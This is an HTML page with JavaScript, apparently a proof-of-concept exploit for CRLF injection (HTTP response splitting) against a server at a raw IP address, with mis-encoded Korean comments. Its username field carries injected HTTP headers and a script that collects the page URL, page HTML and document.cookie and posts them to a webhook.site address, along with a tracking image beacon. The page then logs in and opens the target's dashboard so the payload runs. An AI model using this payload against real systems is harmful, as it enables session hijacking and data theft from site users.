<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Verify CRLF Injection</title>
    <style>
        body { 
            font-family: monospace; 
            padding: 20px; 
            background: #000; 
            color: #0f0; 
        }
        button { 
            background: #0f0; 
            color: #000; 
            border: none; 
            padding: 20px 40px; 
            margin: 10px; 
            cursor: pointer; 
            font-size: 20px;
            font-weight: bold;
        }
        button:hover { background: #0c0; }
        #log { 
            background: #111; 
            padding: 20px; 
            margin-top: 20px; 
            border: 2px solid #0f0;
            min-height: 200px;
        }
        h1 { color: #ff0; }
        .success { color: #0f0; font-weight: bold; }
        .error { color: #f00; font-weight: bold; }
    </style>
</head>
<body>
    <h1>ğŸ¯ CRLF Injection ê²€ì¦</h1>
    <h2>curl í…ŒìŠ¤íŠ¸ ì„±ê³µ! ì´ì œ ë¸Œë¼ìš°ì €ì—ì„œ í™•ì¸í•©ë‹ˆë‹¤.</h2>
    
    <p>curlì—ì„œ í™•ì¸í•œ usernameìœ¼ë¡œ ë¡œê·¸ì¸ í›„ dashboardë¥¼ ì—½ë‹ˆë‹¤:</p>
    
    <button onclick="loginAndOpenDashboard()">ğŸš€ ë¡œê·¸ì¸ & Dashboard ì—´ê¸°</button>
    
    <div id="log"></div>
    
    <script>
    const TARGET = 'http://65.109.202.184';
    const WEBHOOK = 'https://webhook.site/e6f5490e-7765-4cb7-a32e-efd8dbbb4b81';
    
    // curlì—ì„œ ì‚¬ìš©í•œ ê²ƒê³¼ ë™ì¼í•œ username
    const USERNAME = 'testcrlf' +
        '\r\n' +
        'Content-Length: 0\r\n' +
        '\r\n' +
        'HTTP/1.1 200 OK\r\n' +
        'Content-Type: text/html\r\n' +
        '\r\n' +
        '<html><body>' +
        '<h1 style="color:red;font-size:60px">ğŸ‰ CRLF INJECTION SUCCESS!</h1>' +
        '<h2 style="color:blue">Injected JavaScript is running!</h2>' +
        '<img src="' + WEBHOOK + '?status=INJECTION_CONFIRMED" style="display:none">' +
        '<script>' +
        'alert("ğŸ‰ CRLF INJECTION WORKS!");' +
        'setTimeout(function(){' +
        'var data={url:location.href,html:document.body.innerHTML,cookies:document.cookie};' +
        'fetch("' + WEBHOOK + '",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});' +
        '},500);' +
        '</' + 'script>' +
        '</body></html>';
    
    const PASSWORD = 'test123';
    
    function log(msg, type) {
        const el = document.getElementById('log');
        const time = new Date().toLocaleTimeString();
        const cls = type === 'success' ? 'success' : (type === 'error' ? 'error' : '');
        el.innerHTML += `<div class="${cls}">[${time}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }
    
    async function loginAndOpenDashboard() {
        log('ğŸ” Step 1: ë¡œê·¸ì¸ ì¤‘...');
        
        try {
            const formData = new FormData();
            formData.append('username', USERNAME);
            formData.append('password', PASSWORD);
            
            const res = await fetch(TARGET + '/login', {
                method: 'POST',
                body: formData,
                credentials: 'include'
            });
            
            const text = await res.text();
            
            if (res.status === 200) {
                log('âœ… ë¡œê·¸ì¸ ì„±ê³µ!', 'success');
                log('');
                log('ğŸš€ Step 2: Dashboardë¥¼ ìƒˆ ì°½ìœ¼ë¡œ ì—½ë‹ˆë‹¤...', 'success');
                log('âš ï¸  ìƒˆ ì°½ì„ í™•ì¸í•˜ì„¸ìš”!');
                log('âš ï¸  Alert ì°½ì´ ëœ° ê²ƒì…ë‹ˆë‹¤: "CRLF INJECTION WORKS!"');
                log('âš ï¸  ë¹¨ê°„ ê¸€ì”¨: "CRLF INJECTION SUCCESS!" í™•ì¸');
                log('âš ï¸  Webhook í™•ì¸: ' + WEBHOOK);
                
                setTimeout(function() {
                    window.open(TARGET + '/dashboard', '_blank');
                }, 1000);
                
            } else {
                log('âŒ ë¡œê·¸ì¸ ì‹¤íŒ¨: ' + text, 'error');
                log('ğŸ’¡ ë¨¼ì € curlë¡œ ë“±ë¡í–ˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”!');
            }
        } catch (e) {
            log('âŒ ì—ëŸ¬: ' + e.message, 'error');
        }
    }
    
    // ì‹œì‘ ë©”ì‹œì§€
    log('ğŸ¯ ì¤€ë¹„ ì™„ë£Œ!');
    log('curl í…ŒìŠ¤íŠ¸ì—ì„œ "Header without colon" í™•ì¸ ì™„ë£Œ âœ…');
    log('ì´ì œ ë¸Œë¼ìš°ì €ì—ì„œ injected JavaScript ì‹¤í–‰ì„ í™•ì¸í•©ë‹ˆë‹¤.');
    log('');
    log('ë²„íŠ¼ì„ í´ë¦­í•˜ë©´:');
    log('1. testcrlf ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸');
    log('2. Dashboardë¥¼ ìƒˆ ì°½ìœ¼ë¡œ ì—´ê¸°');
    log('3. Injected HTML/JavaScript ì‹¤í–‰ í™•ì¸!');
    </script>
</body>
</html>
